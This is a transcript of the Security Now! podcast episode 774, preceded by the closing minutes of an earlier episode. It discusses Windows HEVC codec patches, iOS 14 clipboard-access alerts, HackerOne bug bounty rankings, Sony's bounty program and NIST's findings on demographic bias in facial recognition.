So anyway, as we said last week, this is the vulnerability that I have a feeling we're going to be hearing about.  I'm not going to spend a lot of time talking about it again.  The problem is the bad guys who find it are going to be quiet about it.  They're going to be using it as a way of getting into people's networks and taking advantage of what is unfortunately a longstanding, widely used stack in embedded IoT devices.  It's definitely something bad guys are going to be probing for.  So the advice for our listeners is this is just a good time to think about all the stuff you've got - printers, routers, IP cameras.  Just go be proactive.  Too few of these things update themselves, especially if they've been around for a long time.  If there's new firmware for them, it's worth installing.



LEO:  Now, did I miss it, or did you skip the Picture of the Week?



STEVE:  I skipped it.  I didn't think it was that noteworthy.



LEO:  Oh, okay.



STEVE:  It's just kind of fun.



LEO:  Well, you know, it's there.  I'll just show it for those of you watching at home.



STEVE:  Yeah.



LEO:  People were saying in the chatroom, oh, you know.  Then I thought, no, I don't remember that part.  And since I'm the guy who's pushing the buttons, I should remember it.  It's just a picture of a hard drive.  Guy's looking at it with a magnifying glass, writing the ones and zeroes.  Silly.  Silly.  At least he's wearing gloves.  I think he's wearing gloves.  I think he's wearing gloves.



STEVE:  It probably was - it was a photo that someone tweeted me.  I thought it was a fun Picture of the Week.  The person is wearing greaseproof gloves, and they're probably dustproof.  So presumably it was meant to be a cleanroom environment where they'd opened the drive.  And of course you can't actually use a microscope.  Now, there were actually, in the old days, in the MFM drive days, there was a fluid you could put on the surface of a disk.



LEO:  No.



STEVE:  Yes.  And it would show - it would resolve the magnetic poles of the data.



LEO:  So it was magnetic fluid or something.  Holy cow.



STEVE:  You actually could, with a magnifying glass, you actually could read it.  The bits were that big.



LEO:  That's wild.  That's amazing.



STEVE:  But that stopped being true a long time ago.



LEO:  Long time ago.  Steve Gibson, he will always be big in our imagination and our esteem.  Every week we do the Security Now! show.  You can tune in and watch us do it live around about 1:30 pm Pacific on Tuesdays, 4:30 Eastern, 20:30 UTC.  So Tuesday afternoon or evening, tune in by YouTube, well, it's on YouTube Live, but actually the best thing to do is go to our website, TWiT.tv/live, and you can pick your stream.  No more Mixer, I'm sorry to say, but there's still plenty of other streams there.  TWiT.tv/live.



Steve's got a number of different unique versions of the show.  His world-famous 16Kb edit, which just sounds wonderful.  And then he also has the transcripts, which no one else has.  That's so you can, you know, he has it all transcribed by Elaine Farris so as you can read along as you listen.  And he has 64Kb versions.  GRC.com.  While you're there, pick up SpinRite, well on its way, I might add, well on its way to 6.1.



STEVE:  It's underway.



LEO:  If you buy it now you'll get the next edition for free.  You'll also get to participate in the beta testing.  That's SpinRite at GRC.com.  He's got lots of other free stuff there like ShieldsUP! and so forth.  So go on over and see that.  We have the show, audio and video of the show at our site, TWiT.tv/sn.  It's also on YouTube in a store-and-forward fashion.  Best thing to do, though, use that fancy RSS Reader you've got there that's known as a podcast program, a podcatcher.  Subscribe to Security Now!, and it'll automatically download it the minute it's available of a Tuesday evening, so you'll have it for your Wednesday morning drive down to the store to pick up more brisket.



My brisket's frozen.  For the whole show it's been at 137 degrees.  Stalled, they call it.  It's stalled.  You know, it's interesting.  There's a whole science about that.  People weren't sure why brisket would stall for a couple of hours, just stop at a temperature.  Turns out it's evaporating the liquid.  It's actually cooling itself so it can't get any hotter.  Once all the liquid's gone - I told Lisa this, she believed me - it will start to heat up.  So I'm going to go home and watch my brisket.  So everybody, thank you for being here.  Thank you, Steve.  Have a wonderful week.  We'll see you next time on Security Now!.



STEVE:  Thanks, buddy.



LEO:  Come on over for some brisket.  Come on over.  It'll be done in about 18 hours.



Copyright (c) 2020 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#774

DATE:		July 7, 2020

TITLE:		123456

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-774.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at two new just-released emergency Windows 10 updates, and the new and curious path they will need to take to get to their users.  We look at a slick new privacy feature coming to iOS 14 and how it is already cleaning up prior behavior.  We'll take our annual survey of the rapidly growing success of the HackerOne program, and also note the addition of a major new participant in their bug bounty management program.  We briefly note the latest American city to ban the use of facial recognition for law enforcement, but we mostly examine the result of NIST's analysis of demographic bias in facial recognition outcomes.  We'll also look at a high-velocity vulnerability and exploitation, and close the loop with a couple of listeners.  I'll share an interesting bit of work on SpinRite's AHCI controller benchmarking.  Then we'll look at this episode's mysterious title:  "123456."



SHOW TEASE:  It's time for Security Now!.  Steve Gibson is here.  Lots to talk about.  We're going to talk about that security flaw in Windows having to do with a video codec and the weird way Microsoft has decided to patch it.  There's a big security issue with F5 networks.  This is used by a lot of BIG-IP networking devices, so it could be a real disaster.  And then we'll explain what 123456 is and what you can learn from it. It's all coming up next on Security Now!.



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 774, recorded Tuesday, July 7th, 2020:  123456.



It's time for Security Now!, the show where we cover the latest security, privacy, and all the news you need to know from the guy who knows the need.  It's Mr. Steve Gibson of GRC, our security guru.  Hi, Steve.



STEVE GIBSON:  And Leo, fortunately my microphone is back on the proper side this week.



LEO:  Oh, thank goodness.  



STEVE:  It was a little disorienting.  I think I'm not quite as  young as I used to be.



LEO:  Did you get any emails from people saying you moved your microphone?



STEVE:  No, it was actually a little unnerving for me.



LEO:  It was you.  It was you.



STEVE:  To have it on the wrong side.  It was like, wait, hold on, wait a minute, what day is it?



LEO:  We have an OCD audience, but we, too, are OCD.  That seems to be the case, yes.



STEVE:  What was I - I have a different acronym for that, obsessive compulsive.  I don't agree that it's a disorder.



LEO:  No.  It's just a way of life.



STEVE:  It's a feature.  It's not a bug, it's a feature.



LEO:  OCF.



STEVE:  Because it does serve me well.



LEO:  That's so funny.



STEVE:  Okay.  So we're at Episode 774.



LEO:  Yes, sir.



STEVE:  For July 7th.  And the podcast's title is, somewhat mysteriously, "123456."



LEO:  I think "Sesame Street" when I hear that, but maybe it's not.



STEVE:  We will get to what that is about.



LEO:  Okay.



STEVE:  But we're going to look at two new, just released, emergency Windows 10 updates and the new and circuitous path they will need to take to get to their users.  It's been a source of quite some controversy.  We look at a slick new privacy feature coming to iOS 14.  I heard you talking about it previously, and how it is already cleaning up prior behavior.  Just brilliant on Apple's part.  Clean.  Simple.  I love it.



We're going to take our annual survey of the rapidly growing success of the HackerOne program, and also note the addition of a major new participant in their bug bounty management.  We briefly note the latest American city to ban the use of facial recognition for law enforcement, but we mostly examine the result of NIST's - the National Institute of Standards and Technology - their analysis of the demographic bias present in facial recognition outcomes.  Which I like because they don't have a bias.



We'll look at a new high-velocity vulnerability and exploitation, close the loop with a couple of our listeners, and I'll share an interesting bit of work from last week on SpinRite's AHCI controller benchmarking.  Then we're going to conclude by discussing the mysterious meaning of this week's episode title, "123456."  Oh, and Leo, we have...



LEO:  Oh, a Picture of the Week, yes.



STEVE:  We have a picture for the ages.  This is, oh, my god, the moment I saw it.  You have to be a geek and know about the first, the original Star Trek series to understand the significance of what this picture is showing us.  So anyway, I just love it.



LEO:  Should we do the Picture of the Week, Steve?



STEVE:  Boy, have we got an upgrade for me and my dorm room this week.



LEO:  I like that one. 



STEVE:  Well, this is just too perfect.  It's a photoshopped image from the first series, the original Star Trek series, like for the times.  We've got Kirk, Spock, and McCoy wearing their COVID-19 protection masks.  And conspicuously, the red security guy is not.



LEO:  No mask.



STEVE:  No mask on that guy.  And of course it's a running joke among all original series Star Trek fans that the red shirts never last very long on away missions. 



LEO:  They're always the first to go.



STEVE:  They've beamed down with four, and only three beam back up because we've lost another red shirt.  And so anyway, this is just - I love the picture because it requires some understanding of the back story, and also to have appreciated watching many episodes where there's some bloodsucking or salt-sucking thing on the planet, and the red shirts are down there, and you're thinking, oh, it's not looking good for the guys in the red shirt.  I would really get a different color shirt if I were...



LEO:  They're security.  They've got to wear the red shirts.  They've got to wear the red shirts so they're always the first to go.  And, you know, I always think about the actors and, "Well, I got my shot.  That was it.  One episode, and I'm gone."



STEVE:  What color's your shirt, honey?  Oh, it's red.  Oh.



LEO:  Oh, too bad.



STEVE:  Try to make your death look realistic, at least.



LEO:  Yeah, yeah.



STEVE:  Okay.  So anyway, wonderful.  Thank you, Twitter.  I thanked the person who sent that to me, so by all means, anybody, any of our listeners who can shoot me Pictures of the Week when they're this wonderful, it will be seen by the world, or at least our little corner of it.



US-CERT posted last Tuesday on June 30th:  "Microsoft has released information regarding vulnerabilities" - and they're oddly low numbered, so apparently Microsoft has known of them for a while, they're 2020-1425 and 1457, the CVE designations - "in Microsoft Windows Codecs Library."  They said:  "This contains updates that are rated as critical.  Remote attackers leveraging these vulnerabilities may be able to execute arbitrary code.  For more information on the vulnerabilities, please refer to the information provided by Microsoft."



And of course it's like, oh, what's this?  Because again, this is out of cycle.  This is the end of June.  They didn't even feel they could wait a couple weeks until July's updates, apparently.  So both of the advisories on Microsoft's site have the same title:  Microsoft Windows Codecs Library Remote Code Execution Vulnerability.  That's for 1425 and 1457.  And the disclosures are almost identical.



But of course at this point our listeners are no longer surprised to learn of a fatal flaw in a media codec.  As we know, codecs are complex interpreters of a compressing encoder's metadata.  It's truly difficult to make a codec both screamingly fast as they need to be and also careful at the same time.  Being super careful means checking everything, and checking everything takes precious time when a codec is by its nature often racing the clock.



So what made these stand out - aside from the fact that they were once again patches for an out-of-cycle critical remote code execution vulnerability, and the second one is an information disclosure - was the fact that Microsoft indicated that the updates would not be available through Windows Update, nor through Windows Update catalog.  No, these updates would be provided through the Microsoft Store.  And I was like, what?  Users are instructed to click on the little white shopping bag on the Windows 10 taskbar.  And I'll note that none of my Windows 10 taskbars have little white shopping bags, but that's another story.  Then you select More, Downloads and Updates, and then Get Updates.



In their disclosure, Microsoft wrote:  "A remote code execution vulnerability exists in the way that Microsoft Windows Codecs Library handles objects in memory."  Okay, no surprise there.  "An attacker who successfully exploited the vulnerability could execute arbitrary code."  Right.  And the other one, a slight variation, same boilerplate.  An attacker who successfully exploited the second vulnerability could obtain information to further compromise the user's system.



And in either case they say:  "The exploitation of the vulnerability requires that a program process a specially crafted image file" - right?  So it's the evil image, which is what you would expect a codec to barf on.  "The update addresses the vulnerability by correcting how Microsoft Windows Codecs Library handles objects in memory."  Then they wrote:  "Affected users will be automatically updated by Microsoft Store."  And according to Microsoft, users who want to receive the update immediately can check for updates with the Microsoft Store App.  That's the clicking on the little white bag that I talked about before.



And as I was thinking about this, I suppose it makes sense for store apps and extensions that are sourced by the Store, even when they are provided by Microsoft, to be updated through the channel that the user used for their original delivery.  And that's especially the case for third-party apps being updated.  I mean, Microsoft would not want to be hosting updates of third-party apps through their own operating system and app update channels, you know, the Windows Update and the Update Catalog.  So the Store it is.



Both updates were privately reported and are not known to be used in the wild.  So it's not clear to me why the emergency.  But the fact that it was on the 30th, which was a Tuesday - is that right?  Yeah, it was a Tuesday.  Maybe that was a deliberate, like, Store Patch Tuesday new thing that is going to be happening.  The problems exist in the HEVC video extensions; and they're not free, surprisingly.  That's 99 cents if you want that from the Microsoft Store.  Maybe you'll get them as part of another package provided.  There's actually two different instances of HEVC on the store.  One's for 99 cents and one says it's provided by other software.



The HEVC extension, apparently not very popular, rates only 2.5 out of 5 stars.  And Microsoft's description says "Play High-Efficiency Video Codec" - that's what HEVC stands for - "in any video app on your Windows 10 device.  These extensions," they say, "are designed to take advantage of hardware capabilities on some newer devices, including those with these Intel 7th Generation Core processor and newer GPU to support 4K and Ultra HD content."  They said:  "For devices that don't have hardware support for HEVC."  So a software codec to enhance what you have on your system.



And this was sort of a new designation for me, and actually we've already gone to the codec beyond this.  But Wikipedia explains that HEVC, this High-Efficiency Video Coding - also known as H.265 and also MPEG-H Part 2 - is a video compression standard designed as part of the MPEG-H project as a successor to the widely used AVC, which is what everybody's now using.  You know, that's H.264, which is MPEG-4 Part 10.  And Wikipedia finished:  "In comparison to AVC, HEVC offers from 25 to 50% better data compression at the same level of video quality, giving it substantially improved video quality at the same bit rate."



Okay.  So if you're curious to know, and it turns out you may need to be curious, whether your system or any system might have the HEVC video extensions installed and, if so, which version, there is a PowerShell command which will tell you.  So you'd open PowerShell, probably do it with admin because why not, and then I have the command in the show notes if you're interested.  But it's Get-AppxPackage -Name Microsoft.HEVCVideoExtension.  When I entered that into my Win10 machine, I got nothing.  It was just blank in return.  But the repaired versions of the HEVC extensions are 1.0.31822.0 or 31823.0.  And so since I don't have them, my PowerShell just exited, returning nothing.



Some commentators have observed that this new Windows Store channel for releasing critical updates outside of the normal Windows security update distribution channels, even though I noted I could see why it happened, it made sense and is understandable, can cause trouble in enterprise settings, where certain Windows features and Windows Store, probably I would imagine the Store more than anything else, may have been deliberately disabled by enterprise policies.  And for such companies who have purposely disabled the Microsoft Store and the Microsoft Store automatic app updates, those vulnerable computers will not receive fixes without the removal of that policy.



And in fact Computerworld's industry fixture Woody Leonhard, over in his "Ask Woody" column, was far less patient with this, and much less understanding than I was about, well, I could understand why it was the Windows Store.  One of the replies to his posting noted that this optional HEVC codec exists by default in Windows clients editions since 1809, except the N and the LTSC editions.  I do have the LTSC, the Long-Term Servicing Channel, so that explains why my PowerShell query came up blank.



But assuming that's the case, it would be probable then that any normal Windows 1809, 1903, 1909, and 2004, would have the vulnerable codec installed, yet presumably be unable to get it updated if the user or an enterprise had determined that they had no interest in the Windows Store and had consequently removed and/or disabled it.  It's exactly the same as if we could uninstall Windows Update, which of course we can't because we need Windows Updates.  So it'll be interesting to see if, like, what happens with this.



Woody wound up his post by writing:  "The distribution method is riddled with all sorts of obvious holes."  He said:  "I mean, anybody with any sort of updating experience should've been able to compile a list of half a dozen ways that this could go wrong."  And he finished:  "Yet another unholy mess."  And actually he also used some of the content in his Computerworld column, where he just really raked Windows or Microsoft for the debacle of the June Windows Update with all the printer issues, basically all the things we've talked about and touched on.  But, ooh, being much less forgiving even than I am.



So takeaway is, if you might fall into the category of having one of the later editions of Windows 10, and having said no to the Windows Store, then you might be in a position of having a machine which is vulnerable to what will probably be exploited before long because that's the way these things go now, yet not have the means for getting that system updated if Windows Store is not going to update you.  So it might be something you want to look into.  Again, you can use that command that I have in the show notes to see if you have it at all.  If so, what version?  And then think about maybe wanting to get it updated because what it would mean is that anything in your system that would render using that codec could be subject to compromise.  And if this is a big enough hole, the bad guys may try to jump through it.  So we'll see what happens.



I mentioned a very slick new iOS 14 feature that is, you know, coming in the official iOS 14 release this fall, caught LinkedIn maybe red-handed.  I don't quite understand their explanation for why they were doing this.  Developers are beginning to play with and explore iOS 14, which is available for iOS developers.  They've been discovering an unexpected and some unwanted behavior from some of their iOS apps.  Apple has added a slick new privacy feature.  It simply shows a pop-up notification when any app reads the content of the user's clipboard.  That's all it does.  Very simple, yet very powerful.  It's just informing you of something going on.



Well, it turns out that a worrisome population of iOS apps have been caught essentially red-handed by this.  And by that I mean, for example, ABC News, Al Jazeera English, CBC News, CBS News, CNBC, Fox News, News Break, New York Times, NPR, ntv Nachrichten, Reuters, Russia Today, Stern Nachrichten, The Economist, The Huffington Post, The Wall Street Journal, Vice News.



Over on the game side:  8 Ball Pool, AMAZE!, Bejeweled, Block Puzzle, Classic Bejeweled, Classic Bejeweled HD, Flip the Gun, Fruit Ninja, Golfmasters, Letter Soup, Love Nikki - yeah, Love Nikki - My Emma, Plants vs. Zombies:  Heroes, Pooking - Billiards City, PUBG Mobile, Tomb of the Mask, Tomb of the Mask:  Color, Total Party Killer, and Watermarbling.



Over on the social side, when TikTok was found to be doing that, that caused a big stir.  Also ToTalk, Truecaller, Viber, Weibo, and Zoosk.  And then in the miscellaneous category, we have whatever 10% Happier: Meditation is; 5-0 Radio Police Scanner; AccuWeather; AliExpress Shopping App; Bed, Bath & Beyond; DAZN; Hotels.com; Hotel Tonight; Overstock; Pigment Adult Coloring Book to Color; Sky Ticket; and the Weather Network.  All of those have for some reason been spotted as looking at your clipboard, apparently for no reason, like when they're not in the foreground.  When they have no business.  When you're not using them.  When they, again, as I said, have no business looking at your clipboard.



Apple now, when they do that, puts in the foreground a little bubble that comes down and fades in from the background a notification.  So as I said, this first, this initially came to light about two weeks ago when the Chinese app TikTok was first caught reading the content of its users' clipboards at short and regular intervals.  TikTok claimed that the feature was part of a fraud detection mechanism, and that the company never stole the clipboard content.  But they promised to remove the behavior, nevertheless, to put users' minds at ease.  To which I'm sure everyone using TikTok probably said yes, please.



Then last week, as developers and users continued experimenting with this new pre-release iOS 14 clipboard access detection system, a developer from the portfolio building portal YourSpace.io discovered that the LinkedIn iOS app was doing this, too.  In a video he shared via Twitter, the YourSpace developer showed how LinkedIn's app was reading the clipboard content after every user key press, even accessing the shared clipboard feature that allows iOS apps to read content from a user's macOS clipboard.  That's one of the new features is that there's sort of a global shared clipboard among iOS apps that are within range of each other.  He noted that LinkedIn was not only copying the contents of his clipboard with every keystroke, but that since iOS supports a cross-device copy-and-paste, LinkedIn was copying the clipboard content of his MacBook Pro via his iPad Pro.



When LinkedIn was asked by the tech press what the heck was going on, LinkedIn's spokesperson claimed that the behavior was a bug - uh-huh - and not intended behavior.  And in a further effort to quell the growing concern, Erran Berger, LinkedIn's VP Engineering of Consumer Products, attempted to clarify, writing on Twitter:  "Appreciate you raising this.  We've traced this to a code path that only does an equality check between the clipboard contents and the currently typed content of a text box."  Okay, that doesn't explain what this person was seeing, but okay.  He says:  "We don't store or transmit the clipboard contents.  We will follow up once the fix is live in our app."



So what's interesting is that whatever it is that it's doing, apparently it's not necessary for it to do that.  It's, oops, a bug.  So they're going to turn it off.  But now that users are being made aware of it, whoops, it's behavior that they've decided that they're going to get rid of.  So for me, the lesson here is that simply notifying users of something that's going on behind their backs, without their knowledge, which has some privacy implications, certainly as sniffing your clipboard  constantly does.  I mean, many of us put sensitive data on the clipboard, like when we're cut-and-copy-pasting a password between apps.  I don't want anything else snapping that.  So I just love the idea that doing nothing but saying, by the way, this app just took a look at your clipboard, that goes a long way toward cleaning up that behavior and eliminating it.



So, you know, bravo to Apple for doing this.  It's unfortunate that it's iOS 14 rather than iOS 1 that we're getting it in.  But anyway, big props to them for that.  And it really does  bring up the whole issue of the safety of using the clipboard or lack thereof.  If any app is able to snap it whenever they want to, I feel a lot less comfortable putting anything sensitive on there.  I have noticed that LastPass will scrub the clipboard proactively for me.  Sometimes it's an inconvenience because they've done that before I've had a chance to copy the content out of it into where it was going.  But I do appreciate that they're not leaving it on the clipboard behind, which is a nice feature.  But again, very simply and cool feature.  So bravo, Apple.



LEO:  I'll do the disclaimer here that both LastPass and LinkedIn are sponsors of the network, just to disclaim that.



STEVE:  Thank you for doing that, yes.



LEO:  It's going to be my guess that there's more to this story we're going to hear about it.  Just too many apps are doing it.  I bet you anything it's something in the Apple UI Kit or something that's...



STEVE:  You mean a false positive?



LEO:  No, I don't think it's a false positive.  But I think it's probably a side effect.  Because it doesn't make sense for  companies, A, to be doing it; and, B, to be doing it maliciously.  So I think it's much more likely that it's something that happens when you do something else in the UI Kit, Apple UI Kit.  Apple may not be off the hook for this, in other words.  It may be part of the framework.  Because there's way too many people being bit by this.  That's a lot of cycles.



STEVE:  There are a lot of people being bit by it.  But compare that to the number of iOS apps.



LEO:  Well, we don't know.  It might be a lot more.  There might be a lot more.  That's just because the only time it comes up is if somebody has iOS 14 beta.  



STEVE:  Yeah, that's true.



LEO:  And then uses those apps.  So I suspect...



STEVE:  A collision of iOS 14 and those apps; right.



LEO:  I suspect it's millions.  And I further suspect it's something in the framework because it doesn't - I feel like that's much more likely than the fact that all these dozens of companies would, A, use those cycles, risk detection, and be snooping on your clipboard.  Like there's no reason Microsoft, who owns LinkedIn, would be snooping on your clipboard.  I don't think that that's in their interest.  The risk of getting caught is high.  I'm sure we're going to learn more about this.  It's just there's something else going on here, yeah.



STEVE:  I look forward to seeing what turns up, yeah. 



LEO:  That's my feeling, anyway.



STEVE:  So HackerOne has shared their top 10 public bounty programs.  Last year we looked at HackerOne's top 10 bounty program to see which companies were paying the biggest and/or most frequent bounties.  Now here we are today, a year later.  We've got HackerOne's update for 2020.  Many of the names on the top 10 list are the same, but they've moved themselves around, up and down, and a few new entrants have appeared.



Verizon Media held the first-place position last year, and they are again solidly, very solidly, in the top slot. It's like Chrome browser compared to the number two, you know, Firefox.  They're way out in advance.  Verizon Media runs by far the most active and successful bug bounty program.  Compared to last year, Verizon increased their annual bounty payouts, increased it by 1.4 million, from the 4 million paid out last year to 5.4 paid out in the most recent year.  And just one of Verizon Media's bug bounties ranks among the top five largest payouts of all time through HackerOne, $70,000 handed to a single enterprising researcher.  So they are in the top slot, and solidly there.



Of course we all know PayPal.  And I'm delighted to see that they are maintaining an active bug bounty program.  We talked a lot in the past about how difficult it is for in-house developers to discover their own problems.  Bug hunting is inherently adversarial, and PayPal is not a newcomer.  Last year they were in the number three spot.  But this year they have replaced Uber to take the number two position.  Unlike Verizon, whose HackerOne program launched in February of 2014, that was like also one of the very earliest or in the top 10, PayPal joined the game much more recently, in August of 2018.



But nevertheless, PayPal quickly established itself as one of the most active companies on the platform.  Over the past two years they've paid out a total of nearly 2.8 million, with a bit more than half of that, 1.62 million, in just the past year.  So what we're going to be seeing here generally is a pattern of, like, the most recent year, pretty much being more than all of the previous history of these companies, suggesting that bug bounties are really here and happening.



Although Uber, as I mentioned, slipped from its number two spot that it held in our previous accounting, they had a significantly leaner year.  They had a strong early start back in December of 2014 that's kept them near the top of the pack.  But in the most recent year, Uber security team awarded 620,000 in bug bounties, bringing the company's all-time total to 2,415,000.  And Uber's bug bounty program ranks in the top five among the most thanked hackers, which is another category that HackerOne tracks, and the top five most reports resolved, and the top five highest bounty paid rankings.  So they also paid out a big one at some point for something that they felt was worth the money. 



With all of their highly publicized recent troubles, and their very deep pockets, I suppose we should not be surprised to see Intel moving up two places from their previous year number six ranking in 2019 to the number four slot today.  But then, paying out more than 1 million in bug bounties to researchers in the past 12 months will have that effect.



And although the exact amount has remained a closely held secret, it is known that Intel holds the sole distinction of having paid the highest bug bounty ever on the HackerOne platform.  The single payout sum is assumed to fall somewhere between 100,000 and $200,000, but the exact amount has been kept a secret.  And if anyone were to guess that it was for a side-channel vulnerability affecting Intel's CPU microarchitectures, you would be right.  So again, nice that Intel is rewarding researchers for work that is certainly time consuming, and also getting their microarchitectures fixed as a consequence.



Twitter is, if nothing else, steady.  They were in the number five slot last year, and they've held that spot this year.  They're running one of the older programs on HackerOne, starting back in May of 2014, having paid out a total of 1.288 million in bounties to security researchers, with 118,000 of that sum distributed in the past 12 months.  So probably stronger payouts earlier, but still in the game and holding onto the fifth rank.



In the sixth position, GitLab has jumped from 10th in the previous lineup, all the way to number six spot.  They're also one of the early entrants, joining in June of 2014.  So they've enjoyed a rather quiet start.  Across all of the six previous years they paid out a total of 570,000 in bounties.  But then, in just this most recent 12 months, they paid out 641,000, so 71,000 more than all of the previous years combined, bringing their total payouts to 1.211 million.  And GitLab also has one of the fastest response times on HackerOne.  Amazingly enough, apparently in average, they respond to researchers within an hour to new bug reports.  So that's really encouraging.



And for the first time, Mail.ru has made it to the top 10.  They moved in a single year from the 14th slot into the number seven position.  Much like GitLab, they've been a member of HackerOne since April of 2014, but their most recent year's bounty payouts totaling 819,000 dwarfed the 300,000 paid out through all previous years.  Their bug bounty program also ranks in the top five most thanked hackers ranking, with 973 thanked hackers; and the top five most reports resolved, 3,333 resolved reports.



Everyone's favorite GitHub is also making recent upward moves.  This year's bounty payouts jumped them from last year's 11th rank into the number eight slot this year.  And the pattern repeats with the most recent year's payouts nearly matching the sum of all previous years.  GitHub paid a total of 467,000 over the past 12 months to security researchers for their responsibly reported bugs.  This brings GitHub's total since joining HackerOne in April of 2016 to 987,000.  So just shy of a million dollars.



And holding steady in its ninth-place ranking we have Valve.  It's been pretty steady in its payouts.  In the most recent year Valve paid 381,000 in bounties to bug hunters, which brought its lifetime program total up to $971,000.



And last and possibly least, considering the effects of COVID-19, we have Airbnb.  As the previous summaries have shown, the bug bounty market is rapidly growing and heating up.  So despite having awarded more than 344,000 in bug bounties over the last 12 months, Airbnb's HackerOne competitive ranking dropped three rungs from its comfortable seventh spot last year.  Overall, Airbnb has awarded a respectable $944,000 in bug bounties since it initiated its program in February of 2015.  And as we know, their software is all the better for it.



So I think, taken overall, these numbers reveal, as I have observed, that bug bounties are finally becoming a mainstream essential component of any mature business whose software creates a privacy or a security exposure for the company, its employees, or its customers.



LEO:  Okay.  Who's paying the most?  Who's the new one?



STEVE:  Sony.



LEO:  Oh.  What a surprise.  Seems like a good idea.



STEVE:  Sony has launched, yup, they've launched a PlayStation bug bounty program with rewards of $50,000 and perhaps more.  They'll be paying security researchers for bugs in the PlayStation 4 gaming console, its operating system, official PS4 accessories, and also the PlayStation Network and related websites.



LEO:  Good.  Because as we know, Sony has been vulnerable in the past.



STEVE:  And they're a target.  Following on the now, yeah, the now well-established responsible disclosure model, Sony will reward security researchers who discover bugs in all of their stuff. 



LEO:  Good.



STEVE:  And unlike Microsoft and Nintendo, who both top out their bounties at a measly $20,000, Sony has said that it plans to pay researchers between 100 and up to 50,000 or even higher for vulnerabilities reported in the company's products.



LEO:  Nice.



STEVE:  The eligible targets of opportunity, as I mentioned, include the PlayStation 4 gaming console, operating system, official accessories, the network and related websites.  And as I teased, Sony's new Vulnerability Rewards Program, they call it the VRP, will also be managed through HackerOne.



LEO:  Yay.



STEVE:  Prior to taking their VRP program public, Sony had been running a private in-house invitation-only vulnerability rewards program, up until last year.  And we know that the world of gaming has historically been a target-rich environment.  Hackers tend to heavily target gaming accounts, which are usually abused for fraud or put up for sale online on underground hacking forums.  And this past April hackers abused a vulnerability in an old Nintendo authentication mechanism to hijack more than 300,000 accounts.  So, you know, Sony has the sort of deep pockets that make the creation of a bug bounty program a "just do it" no-brainer.  So, you know, congrats to Sony, and cool that they've joined the ranks of HackerOne's program participants.



LEO:  What does the amount of the bounty mean?  What is that communicating?



STEVE:  Generally it is importance of what was found, and often  the difficulty of doing it.  So, you know, if it's a cross-site scripting vulnerability in a web page, it's, yeah, okay, thanks, here's a thousand bucks.  If it's a way of bypassing, for example, the PlayStation 4 DRM, you could dangle that in front of them and probably name your price.  



LEO:  We want to know that one, yes, yeah.  So it's the value to the company, the difficulty involved, and having a higher, you know, does it mean something to say that Sony's offering up to $50,000 compared to Microsoft's 20?



STEVE:  Well, yeah, because there is a limited supply of gifted hackers.



LEO:  Ah.  You want to attract the best.



STEVE:  Uh-huh.  So you want motivation.  I mean, if Sony really is serious about having their stuff secure, you've got to motivate the talented, responsible disclosing hackers to focus their bead on Sony rather than on Microsoft or Nintendo or someone else.



LEO:  Makes perfect sense.



STEVE:  So, yeah, it's definitely the case that offering a greater reward is right connected to incentive.  So you want to create the incentive.



The City of Boston just joined the growing number of cities that we've been talking about recently to just say no to law enforcement's use of facial recognition.  And this makes Boston the second largest city to do so, behind only San Francisco.  So the question is, just what exactly are such a system's  limitations and liabilities?  Because, you know, the decision has been made, now increasingly, that the technology's currently rather profound limitations and liabilities are judged to outweigh its benefits.  So I'm annoyed by the idea that the results of tests to detect bias might themselves be biased.  It's one thing to not like the idea and to find it creepy, as I know we do.  But that alone doesn't mean it doesn't work.



The good news is the U.S. National Institute of Standards and Technology, our NIST, conducted their own analysis, the results from which were published late last year, and they are indeed quite eye-opening.  NIST posed itself the question:  "How accurately do face recognition software tools identify people of varied sex, age, and racial background?"  Not surprisingly, NIST found that the answer depends upon the algorithm at the heart of the system, the application that uses it, and the data it's fed.  However, they did also determine that the majority of face recognition algorithms exhibit strong demographic differentials.  In this usage the term "differential" means that an algorithm's ability to match two images of the same person varies between demographic groups.



NIST's results, which were captured in their report titled "Face Recognition Vendor Test (FRVT) Part 3:  Demographic Effects," were and are intended to inform policymakers and to help software developers better understand the performance of their algorithms.  The report quoted its author, Patrick Grother, an NIST computer scientist and the primary author of the report.  Patrick said: "While it is usually incorrect to make statements across algorithms, we found empirical evidence for the existence of demographic differentials in the majority of the face recognition algorithms we studied.  While we do not explore what might cause these differentials, this data will be valuable to policymakers, developers, and end users in thinking about the limitations and appropriate use of these algorithms."



The study was conducted through NIST's Face Recognition Vendor Test (FRVT) program, which evaluates face recognition algorithms submitted by industry and academic developers on their ability to perform different tasks.  I need to take a sip of milk here.



LEO:  Milk?



STEVE:  Actually it's water.  I said milk because it's white.  Water.  The NIST study evaluated - get this, Leo - 189 software algorithms from 99 different developers.



LEO:  It's amazing that there's that many.  Holy cow.



STEVE:  Yeah, I know, exactly.  It's like holy crap, 99 different sources.



LEO:  Yeah.



STEVE:  I mean, and that tells you that there was a clear rush, you know, to get into this technology.



LEO:  Oh, yeah.  Oh, yeah.



STEVE:  No doubt a ton of venture capital was poured into these things.  So that represents a large majority of the industry.  The report focuses - I don't know what's happened here.  Excuse me.  It focuses on how well each individual algorithm performs one of two different tasks that are among face recognition's most common applications.  The first task, confirming a photo matches a different photo of the same person in a database, is known as "one-to-one matching" and is commonly used for verification work, such as unlocking a smartphone or checking a passport.  The second, determining whether the person in the photo has any match in a database, is known as "one-to-many matching" and can, in theory at least, be used for identification of a person of interest.



To evaluate each algorithm's performance on its task, the team measured the two classes of error the software can make:  false positives and false negatives, where a false positive means that the software wrongly considered photos of two different individuals to show the same person, and a false negative means the software failed to match two photos that are of the same person.  These distinctions are obviously important because the class of error and the type of search performed can carry vastly different consequences, depending upon real-world application.



Patrick said:  "In a one-to-one search, a false negative might be merely an inconvenience  for example, you can't get unlock your phone - but the issue can usually be remediated by a second attempt.  Whereas a false positive in a one-to-many search puts an incorrect match on a list of candidates that warrant further scrutiny."



NIST's description of this noted that the thing that sets the publication apart from most other face recognition research is its concern with each algorithm's performance when considering demographic factors.  For one-to-one matching, only a few previous studies have explicitly explored demographic effects; for one-to-many matching, none have.



